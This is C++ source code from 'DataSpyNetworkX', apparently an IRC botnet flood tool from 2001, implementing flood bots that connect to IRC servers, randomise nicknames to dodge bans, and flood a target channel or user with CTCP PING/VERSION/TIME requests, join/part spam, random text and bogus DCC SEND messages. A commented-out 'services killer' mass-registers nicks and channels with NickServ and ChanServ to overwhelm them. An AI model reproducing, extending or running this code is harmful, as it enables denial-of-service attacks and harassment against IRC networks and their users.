/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#include "..\include\globals.h"
#include "..\include\iohandler.h"
#include "..\include\Base.h"
#include "..\include\MainBot.h"
#include "..\include\tcp.h"
#include "..\include\nicknames.h"
#include "..\include\FloodBot.h"

extern int iMAXNICKz;

void FloodBot::Close (SOCKET iCheckSocket)
{
		BOOL oldEn = this->Status.Enabled;
		this->Status.Enabled = FALSE;
		
		if ((this->iSocket = this->Connect()) == INVALID_SOCKET)
			g_IOSock->Remove(g_IOSock->GetIdFromPointer(this));
		else
		{
			this->Status.Enabled = oldEn;
			this->NewNick();
		}
}

int TcpSock::Connect() //Connects - Added with Server Lists
{
	char *cRServer = NULL; 
	BOOL bSList; 
	int iTryNum=0,iListNum =0;
	SOCKET The_Socket=-1;

getserver:;
	bSList = FALSE;
	ServerList *temp = NULL;

	//Check For Server List
	if (!strnicmp(this->cServer,"sl\0",2) && lstrlen(this->cServer) == 3)
	{
		temp = g_FirstSList;
		iListNum = atoi( this->cServer + 2 );
		if (iListNum >= 0 && iListNum <= g_iSList && g_iSList)
		{
			int i=0;
			for (;i<g_iSList;i++)
			{
				if (temp->iListposition == iListNum)
					break;
				temp = temp->pNext;

			}
			if (i == g_iSList)//No serverlist
			{	
				temp=NULL;
				goto notslist;
			}			

			// 0=current 1=last 2=original
			if (this->iSList[2] == -1) //First time through?
			{
				//Set last current and original
				this->iSList[2]=this->iSList[1] =this->iSList[0]= Random(0,temp->iNumber);
				cRServer = temp->List[this->iSList[1]];
			}
			else
			{
				this->iSList[1]++;
				cRServer = temp->List[(this->iSList[2] + this->iSList[1]) % temp->iNumber];
			}
			
		}
	}
notslist:
	if (!temp) //Not a servers list
			cRServer = this->cServer;

	//Connect the socket
	The_Socket = SocketOpen(iPort,cRServer,this->GetMessageID());
	iTryNum++;

	if (The_Socket == INVALID_SOCKET)
	{
		if (temp) //Didn't Connect and its a socket list
		{
			if (iTryNum < temp->iNumber *4)
				goto getserver;
			else
				return INVALID_SOCKET;
		}
		else if (iTryNum++ > 5) //We have tried 5 time to connect to a server (non server list)
			return INVALID_SOCKET;
	
	}
	//Right connected

	if (this->GetType() == FB || this->GetType() == MB)
	{
		char *cDel[5]; int iTot=0;
		for (int zz=0;zz < 4;zz++)
		{
			cDel[zz] = GetNick(FALSE);
			iTot += lstrlen(cDel[zz]);
		}
		cDel[4] = new char[32 + iTot];
		sprintf(cDel[4],"USER %s %s %s :%s\n\0",cDel[0],cDel[1],cDel[2],cDel[3]);
		EasySSend(The_Socket,cDel[4]);
		for (int zd=0;zd<4;zd++)
			delete cDel[zd];
	}

	return The_Socket;
}
	
IrcSocket::~IrcSocket()
{
	if (this->GetType() == FB)
	{
		int iWait =0;
		this->Status.Online=FALSE;
		this->iTypeFB = -5;
		while (Status.Enabled && iWait < 21)
		{
			Sleep(500); //Waits 10 total Seconds for bot to quit itself..
			iWait++;
		}
		closesocket(this->iSocket);	
	}
	else if (this->Status.Online)
	{
		EasySSend(this->iSocket,c_QUITMSG);
		closesocket(this->iSocket);
	}
}

void IrcSocket::DataIn (SOCKET iCheckSocket) //Default IRC DataIn For Floodbots And MainBots
{
	if (iCheckSocket != this->GetSocketNum()) return;

	char *cIn	= NULL,
		 *cTemp	= NULL;

	int dLen = 0;

	if((dLen = SocketRecv(iCheckSocket,&cIn)) <= 0)
		return;

	cIn[dLen] =0;

	char *cOther = cIn,
		 *cSend = new char[128];

	goto start; //We need to skip the first cOther = cTemp;

	while (1)
	{
		cOther = cTemp; //Swap Em Round
start:
		cTemp = BreakString(cOther,"\r\n\0");

		if (cTemp == NULL)	break;

		if (strncmp(cOther, "PING :",6) == 0) //Generically we need this
		{
			
			sprintf(cSend,"PONG%s\n",cOther + 4);
			EasySSend(this->GetSocketNum() ,cSend);
			
		}	
		else 
		{
			char *cFirst = strstr(cOther," "); 

			if (cFirst == NULL) continue;
			
			cFirst++;
			
			char *cSecond = strstr(cFirst," "); 
			
			if (cSecond == NULL) continue;
			
			if (cSecond - cFirst == 3)
			{
				switch(atoi(cFirst)) //Get Number
				{
					case (1): //Welcome to da network d00d
						this->Status.Online = TRUE;
						if (this->Type == MB)
						{	
							sprintf(cSend,c_DOUBLE_STRINGS,c_JOIN,this->cOther);
							EasySSend(this->iSocket,cSend);
						} 
						else if (this->Type == FB)
						{
							cFirst +=4;
							strchr(cFirst,' ')[0] =0;
							sprintf(cSend,"MODE %s +d\n",cFirst); //Sets floodbots +d == Deaf (so they dont flood themselves)
							EasySSend(this->GetSocketNum(),cSend);
							this->Go();
						}
						break;

					case (404)://Channel is moderated, if were a FB lets switch to nick flooding
						{
							if (this->GetType() == FB)
							{
								cSecond ++;
								char *cTmp = strchr(cSecond,' ');
								cTmp ++;
								if (strncmp(cTmp,this->cOther,lstrlen(this->cOther)) == 0)
									this->iTypeFB = 5;
							}
						}
						break;

					case (432): //Erronous chars in nick
					case (433): //Nickname is already in use
					//case (437): //ERR_BANNICKCHANGE
							{
								this->NewNick();
							}
				}
			}
			else
			{
				if (this->Type == MB)
					this->Process(cOther);
			}
		}
	}

	delete cIn,cSend;
}

FloodBot::FloodBot(char *cFServer, int cFPort)
{
	this->iPort = cFPort;
	this->Type = FB;
	this->iTypeFB = 1;
	if(g_IOSock->Insert(this))	
	{
		this->cServer = strcpy(new char[lstrlen(cFServer)],cFServer);
		if( (this->iSocket = this->Connect()) == INVALID_SOCKET)
			g_IOSock->Remove(g_IOSock->GetIdFromPointer(this));
		else
			this->NewNick();
	}
	else
		delete this;
}

//DAL : -NickServ- Usage: REGISTER <password> <email>  MAX_PASS = 64 MAX_NICK = 64
//{ CTCP = 1,JP = 1,RTEXT = 2,SKILL = 3}; //Join/Part CTCP RepetedText SevicesKill

void FloodBot::Go()
{
	char *cSend = new char[2048],*cTemp[5] ={0};
	int iOld =0;

	while (this->Status.Online) //While we are meant to be online
	{
		while (!this->Status.Enabled) //Dont do it now? then wait for it!
			Sleep(500);

		if (lstrlen(this->cOther) < 2) return; //Needed?
	
		if (this->cOther[0] == '#') //Does it need to join a channel?
		{
			sprintf(cSend,c_DOUBLE_STRINGS,c_JOIN,this->cOther );
			EasySSend(this->GetSocketNum(),cSend);
		}
		iOld = this->iTypeFB;
		Sleep(Random(0,2500));
		
		do {
			cSend[0] = 0;
			switch(this->iTypeFB)
			{
				case(CTCP): //Ctcp flooding, this is PING, VERSION and TIME (stuff which needs a reply) - Most effective flooding
				{
					cTemp[0] = RandomText();
					sprintf(cSend,"%s%s :\001PING %s\001\n%s%s :\001VERSION\001\n%s%s :\001TIME\001\n\0",c_PRIVMSG,this->cOther,cTemp[0],c_PRIVMSG,this->cOther,c_PRIVMSG,this->cOther);
				}
				break;
				
				case(JP): //Join part flooding
				{
					char *cTmp = new char[lstrlen(c_DOUBLE_STRINGS) *3];
					sprintf(cTmp,c_DOUBLE_STRINGS,c_DOUBLE_STRINGS,c_DOUBLE_STRINGS);
					sprintf(cSend,cTmp,c_JOIN,this->cOther,c_PART,this->cOther);
				}
				break;
				case(RTEXT):
				{
					cTemp[0] = RandomText(1024);
					sprintf(cSend,"%s%s :%s\n",c_PRIVMSG,this->cOther,cTemp[0]);
					Sleep(10000);
				}
				break;
				case(SKILL):
					{
						sprintf(cSend,"%s%s :\x01\DCC SEND %s %u %i %i\x01\n",c_PRIVMSG,this->cOther,RandomText(),Random(32000,64000)*Random(32000,64000),Random(0,25000),Random(0,250000));
					}
//Services killer
/*
				case(SKILL):
				:DataSpy!~Grnder@ads-2532 PRIVMSG blah :?DCC SEND earthlights.txt 2130706433 2567 8275?
					char *cRnd[12],*cRmb[20];
					int iTmp=0,iChans=10;
					int iPause = atoi(cOtherData); if (iPause < 15) iPause =15; 
					char *cDelMe = RandomText(); sprintf(cSend,"%s%s\n",c_NICK,cDelMe); EasySSend(this->GetSocketNum(),cSend); delete cDelMe;

					do {
						cRnd[0] = RandomText(64); 
						cRnd[1] = RandomText(60);
						cRnd[1][Random(10,50)] = '@';
				
					//Regs Nick
						sprintf(cSend,"%s%s :register %s %s.com\n",c_PRIVMSG,c_NICKSERV,cRnd[0],cRnd[1]); EasySSend(this->iMySocket,cSend);
			
						delete cRnd[0],cRnd[1];//Bah fuckin memory
					                  
						for (iTmp =0;iTmp < iChans / 2;iTmp++)
						{
							cRnd[iTmp] = RandomText(Random(15,30));
							cRnd[iTmp][0] = '#';
							sprintf(cSend,c_DOUBLE_STRINGS,c_JOIN,cRnd[iTmp]);
							EasySSend(this->GetSocketNum(),cSend);
							Sleep(7900);				
						}
			
					//-ChanServ- Syntax: REGISTER channel password description
					for (iTmp =0;iTmp < iChans;iTmp++)
					{
						cRmb[0] = RandomText(Random(5,30)); 
						cRmb[1] = RandomText(Random(5,60));
						sprintf(cSend,"%s%s :register %s %s %s\n",c_PRIVMSG,c_CHANSERV,cRnd[iTmp],cRmb[0],cRmb[1]);
						EasySSend(this->GetSocketNum(),cSend);
						Sleep(10000);
					}

					cSend[0] = 0;
					for (iTmp =0;iTmp < iChans /2 ;iTmp++)
					{
						sprintf(cSend,c_DOUBLE_STRINGS,c_PART,cRnd[iTmp]);
						EasySSend(this->GetSocketNum(),cSend);
						Sleep(7900);		
					}
			
			}
			//*/
				default:
					break;
			}
			EasySSend(this->GetSocketNum(),cSend);
			this->NewNick(TRUE);
			Sleep(2048);			
		} while (this->En() && iOld == this->iTypeFB);


		if (!this->On())  //We quitting?
		{			
			this->Status.Enabled=FALSE;
			break;
		}
		else if (this != INVALID_IO_HANDLER)
		{
			if (this->cOther[0] == '#' && !this->En())
			{
				sprintf(cSend,c_DOUBLE_STRINGS,c_PART,this->cOther);
				EasySSend(this->GetSocketNum(),cSend);
			}
			this->NewNick(TRUE);
		}
		else 
			break;
	}
	//Right we quit now :P
	delete cSend;
}

void IrcSocket::NewNick(BOOL bRandom)
{
		char	*Temp	= NULL,
				*Temp1	= NULL,
				*cSend = new char[128];
		int nicksize =0;
		if (bRandom)
		{
			Temp  = RandomText(MAX_NICK_LEN - Random(0,MAX_NICK_LEN/2));
			sprintf(cSend,c_DOUBLE_STRINGS,c_NICK,Temp);
		}
		else
		{
			Temp  = GetNick(TRUE);
			Temp1 = GetNick(FALSE);
			sprintf(cSend,"%s%s\nSETNAME %s\n\0",c_NICK,Temp,Temp1); 
			delete Temp1;

			nicksize = lstrlen(Temp);
			this->iMyNickLen = nicksize;
			//if(this->cMyNick)delete this->cMyNick;
			cMyNick = strcpy(new char[nicksize],Temp);
		}


		EasySSend(this->GetSocketNum(),cSend);
		delete cSend;
		delete Temp;

}

